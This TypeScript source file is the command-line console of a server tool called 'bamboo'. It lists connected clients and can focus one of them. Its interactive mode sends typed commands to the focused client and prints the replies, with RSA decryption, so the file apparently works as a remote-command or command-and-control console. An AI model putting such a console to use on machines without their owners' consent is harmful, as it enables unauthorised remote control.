import { config } from "../config/config";
import { MainServer } from "./server";
import chalk from "chalk";
import chalkAnimation from "chalk-animation"
import inquirer from "inquirer"
import { createSpinner } from "nanospinner";
import { MessageType } from "../types/messageTypes";
import { RSA } from "../lib/rsa";

const sleep = (ms = config.sleepTime) => new Promise((r) => setTimeout(r, ms))

export class CLI {
    private server?: MainServer;
    constructor() {
        // this.server = new MainServer();
    }

    private startServer = () => {
        const spinner = createSpinner("Starting server...").start()
        if (!this.server) {
            this.server = new MainServer()
            const started = this.server?.start();
            if (started) {
                spinner.success({ text: "Server started successfully !" })
            } else {
                spinner.error({ text: "Cannot start server !" })
            }
        } else {
            spinner.error({ text: "The server is already running !" })
        }
    }

    private closeServer = () => {
        const spinner = createSpinner("Closing server...").start()
        if (this.server) {
            const stopped = this.server.close();
            if (stopped) {
                spinner.success({ text: "Server closed successfully !" })
                this.server = undefined
                return true
            } else {
                spinner.error({ text: "Cannot close server !" })
                return false
            }
        } else {
            spinner.success({ text: "Server closed successfully !" })
            return true
        }
    }

    private restartServer = () => {
        const spinner = createSpinner("Restarting server...").start()
        if (this.server) {
            const stopped = this.server.restart();
            if (stopped) {
                spinner.success({ text: "Server restarted successfully !" })
                return true
            } else {
                spinner.error({ text: "Cannot restart server !" })
                return false
            }
        } else {
            spinner.success({ text: "Server restarted successfully !" })
            return true
        }
    }

    private setServerPort = (port: number) => {
        const spinner = createSpinner("Changing port...").start()
        if (this.server) {
            config.serverPort = port;
            this.server.setPort(port)
            const stopped = this.server.restart();
            if (stopped) {
                spinner.success({ text: "Port changed successfully !" })
                return true
            } else {
                spinner.error({ text: "Cannot restart server !" })
                return false
            }
        } else {
            spinner.error({ text: "The server is not running !" })
            return true
        }
    }

    private getServerPort = (): number => {
        return this.server.getPort();
    }

    private setDebugMode = (value: boolean) => {
        const spinner = createSpinner("Changing debug mode...").start()
        config.debugMode = value;
        spinner.success({ text: "Debug mode changed successfully !" })
    }

    private getDebugMode = (): boolean => {
        return config.debugMode;
    }

    private setRsaLength = (number: number) => {
        const spinner = createSpinner("Changing rsa length...").start()
        config.serverRSAPrimeBitLength = number;
        spinner.success({ text: "Rsa length changed successfully !" })
    }

    private getRsaLength = (): number => {
        return config.serverRSAPrimeBitLength;
    }

    private rpad = (max: number, text: string) => {
        return `${' '.repeat((max - text.length) / 2)}${text}${' '.repeat(Math.round((max - text.length) / 2))}`
    }

    private listClients = () => {
        if (this.server) {
            const IpText = "IP";
            const NameText = "Nom";
            const CreationText = "Date de creation";

            const maxIpLenth = Math.max(...this.server.getClients().map(client => client.socket.remoteAddress.length), IpText.length) + 4;
            const maxNameLength = Math.max(...this.server.getClients().map(client => client.name.length), NameText.length) + 4;
            const maxCreationDateLength = Math.max(...this.server.getClients().map(client => client.connectionDate.toLocaleDateString().length), CreationText.length) + 4;

            console.log(`/${'-'.repeat(maxNameLength)}+${'-'.repeat(maxIpLenth)}+${'-'.repeat(maxCreationDateLength)}\\`)
            console.log(`|${this.rpad(maxNameLength, NameText)}|${this.rpad(maxIpLenth, IpText)}|${this.rpad(maxCreationDateLength, CreationText)}|`)
            for (let i = 0; i < this.server.getClients().length; i++) {
                console.log(`|${'-'.repeat(maxNameLength)}+${'-'.repeat(maxIpLenth)}+${'-'.repeat(maxCreationDateLength)}|`)
                const client = this.server.getClients()[i];
                console.log(`|${this.rpad(maxNameLength, client.name)}|${this.rpad(maxIpLenth, client.socket.remoteAddress)}|${this.rpad(maxCreationDateLength, client.connectionDate.toLocaleDateString())}|`)
            }
            console.log(`\\${'-'.repeat(maxNameLength)}+${'-'.repeat(maxIpLenth)}+${'-'.repeat(maxCreationDateLength)}/`)

        } else {
            console.log("The server is not running !")
        }
    }

    private setFocusedClient = (clientName?: string) => {
        if (!this.server) {
            console.log("Server is not running !")
            return
        }
        const focused = this.server.setFocusedClient(clientName)
        if (!clientName && focused) {
            console.log("Client unfocused successfully !")
            return
        }
        if (focused) {
            console.log(`Client ${this.server.getFocusedClient().name} has been focused !`)
        } else {
            console.log("Can't focus this client !")
        }
    }

    private getFocusedClient = (clientName?: string) => {
        if (!this.server) {
            console.log("Server is not running !")
            return
        }
        console.log(`Focused client: ${this.server.getFocusedClient().name}`)
    }

    private changeClientName = (oldName: string, newName: string) => {
        const spinner = createSpinner("Changing client name...").start()
        if (/(client-([0-9]*))$/.test(newName)) {
            spinner.error({ text: "This client name can't be used !" })
            return
        }
        if (!this.server) {
            spinner.error({ text: "Server is not running !" })
            return
        }
        if (!this.server.setClientName(oldName, newName)) {
            spinner.error({ text: "Client doesn't exists or name already taken !" })
            return
        }
        spinner.success({ text: "The name of the client has been changed successfully !" })
    }

    private ping = (clientName: string) => {
        if (!this.server) {
            console.log("Server is not running !")
            return
        }
        const response = this.server.sendPing(clientName);
        if (!response) {
            console.log("Can't send ping, maybe this client doesn't exists !")
            return;
        }
        console.log("Ping sent !")
    }

    private interactWithFocused = async () => {
        if (!this.server) {
            console.log("Server is not running !")
            return
        }
        const focusedClient = this.server.getFocusedClient();
        if (!focusedClient) {
            console.log("No client is focused !")
            return
        }
        this.server.sendMessageToFocused("interact")
        console.log(`Entering interactive mode with ${focusedClient.name}. Type 'exit' to leave.`)
        await this.interactiveMode();
    }

    private interactiveMode = async () => {
        const focusedClient = this.server.getFocusedClient();
        if (!focusedClient) {
            console.log("No client is focused !")
            return
        }
        while (true) {
            const answers = await inquirer.prompt({
                name: "user_command",
                type: "input",
                message: chalk.green(`[${focusedClient.name}]$ `),
                validate: (value: string) => (value.trim() !== "")?true:"Entrez une commande."
            });

            const command: string = answers.user_command.trim();
            if (command.toLowerCase() === 'exit') {
                console.log(`Exiting interactive mode with ${focusedClient.name}.`)
                break;
            }

            this.server.sendMessageToFocused(command);

            // Wait for the response from the client
            await this.waitForResponse();
        }
    }

    private waitForResponse = (): Promise<void> => {
        return new Promise((resolve) => {
            const focusedClient = this.server.getFocusedClient();
            if (!focusedClient) {
                resolve();
                return;
            }

            const handleData = (data: Buffer) => {
                const message = data.toString();
                const json: MessageType = JSON.parse(message)
                let clearMessage = json.content
                if(json.encrypted){
                    clearMessage = RSA.decrypt(json.content, this.server.getPrivateKey())
                }
                console.log(chalk.blue(clearMessage));
                resolve();
            };

            focusedClient.socket.once('data', handleData);
        });
    }

    public startCLI = async () => {
        let welcomeText = chalkAnimation.pulse(chalk.green("Welcome to bamboo CLI !"));
        await sleep()
        welcomeText.stop();

        this.askCommand()
    }

    public validateCommand = (input: string) => {
        if (/^(exit)$/.test(input)) {
            return true
        } else if (/^(server)(.*)?$/.test(input)) {
            if (/^(server start)$/.test(input)) {
                return true
            } else if (/^(server stop)$/.test(input)) {
                return true
            } else if (/^(server restart)$/.test(input)) {
                return true
            }
            return "Usage: \n- server <start|stop|restart>"
        } else if (/^(clients)(.*)?$/.test(input)) {
            if (/^(clients list)$/.test(input)) {
                return true
            } else if (/^(clients focus)$/.test(input)) {
                return "Usage: \n - clients focus <CLIENT_NAME>"
            } else if (/^(clients focus (.*))$/.test(input)) {
                return true
            } else if (/^(clients rename (.*) (.*))$/.test(input)) {
                return true
            } else if (/^(clients unfocus)$/.test(input)) {
                return true
            } else if (/^(clients interact)$/.test(input)) {
                return true
            }
            return "Usage: \n- clients <list|focus|unfocus|interact>"
        }

        // ping
        else if (/^(ping(.*))$/.test(input)) {
            if (/^(ping (.*))$/.test(input)) {
                return true
            }
            return "Usage: \n- ping <CLIENT_NAME>"
        }
        // config
        else if (/^(config)(.*)?$/.test(input)) {
            // port config
            if (/^(config set port)(.*)$/.test(input)) {
                if (/^(config set port) ([0-9]{1,})$/.test(input)) {
                    return true
                }
                return "Port value should be a number !"
            } else if (/^(config get port)$/.test(input)) {
                return true
            }

            // debug mode
            else if (/^(config get debug)$/.test(input)) {
                return true
            } else if (/^(config set debug(.*)?)$/.test(input)) {
                if (/^(config set debug (true|false)?)$/.test(input)) {
                    return true
                }
                return `Debug value should be ${chalk.underline("true")} or ${chalk.underline("false")}`
            }

            // rsa_length
            else if (/^(config set rsa_length)(.*)$/.test(input)) {
                if (/^(config set rsa_length) ([0-9]{1,})$/.test(input)) {
                    return true
                }
                return "RSA length value should be a number !"
            } else if (/^(config get rsa_length)$/.test(input)) {
                return true
            }
            return "Usage: \n- config <set|get> <port|debug|rsa_length> <value>"
        }
        else {
            return "Command not found !"
        }
    }

    private askCommand = async () => {
        const answers = await inquirer.prompt({
            name: "user_command",
            type: "input",
            message: chalk.green("[Bamboo]$>"),
            validate: this.validateCommand,
        })

        const command: string = answers.user_command;
        switch (command) {
            case "exit":
                const closeServer = this.closeServer()
                if (closeServer) {
                    console.log(chalk.gray("👋 Bye !"))
                    process.exit(0)
                }
                break;

            case command.match(/^(ping (.*))$/)?.input:
                const pingedClientName = command.split(" ")[1]
                this.ping(pingedClientName)
                this.askCommand()
                break;

            case "server start":
                this.startServer()
                this.askCommand()
                break;

            case "server stop":
                this.closeServer()
                this.askCommand()
                break;

            case "server start":
                this.startServer()
                this.askCommand()
                break;

            case "server restart":
                this.restartServer()
                this.askCommand()
                break;

            case "clients list":
                this.listClients()
                this.askCommand()
                break;

            case "clients unfocus":
                this.setFocusedClient();
                this.askCommand()
                break;

            case "clients interact":
                await this.interactWithFocused();
                this.askCommand();
                break;

            case command.match(/^(clients focus (.*))$/)?.input:
                const focusClientName = command.split(" ")[2]
                this.setFocusedClient(focusClientName)
                this.askCommand()
                break;

            case command.match(/^(clients rename (.*) (.*))$/)?.input:
                const oldName = command.split(" ")[2]
                const newName = command.split(" ")[3]
                this.changeClientName(oldName, newName)
                this.askCommand()
                break;

            case command.match(/^(config set port) ([0-9])*$/)?.input:
                const port = command.split(" ")[3]
                try {
                    const portNumber = Number.parseInt(port)
                    this.setServerPort(portNumber)
                } catch (err) {
                    console.log(chalk.red("Port value should be a number !"))
                }
                this.askCommand()
                break;

            case "config get port":
                console.log(chalk.green(`Server is running on port: ${this.getServerPort()}`))
                this.askCommand()
                break;

            case command.match(/^(config set debug (true|false)?)$/)?.input:
                const debug = command.split(" ")[3]
                this.setDebugMode(debug === "true" ? true : false)
                this.askCommand()
                break;

            case "config get debug":
                const currentDebugModeValue = this.getDebugMode()
                if (currentDebugModeValue) {
                    console.log("Debug mode is enabled !")
                } else {
                    console.log("Debug mode is disabled !")
                }
                this.askCommand()
                break;

            case command.match(/^(config set rsa_length) ([0-9])*$/)?.input:
                const rsa = command.split(" ")[3]
                try {
                    const rsaLength = Number.parseInt(rsa)
                    if (4096 % rsaLength !== 0) {
                        console.log(chalk.red("RSA length value should be a divider of 4096 !"))
                    } else {
                        this.setRsaLength(rsaLength)
                    }
                } catch (err) {
                    console.log(chalk.red("RSA length value should be a number !"))
                }
                this.askCommand()
                break;

            case "config get rsa_length":
                console.log(chalk.green(`Rsa length: ${this.getRsaLength()}`))
                this.askCommand()
                break;

            default:
                console.log(chalk.gray("Command not implemented !"))
                this.askCommand()
                break;
        }

    }
}
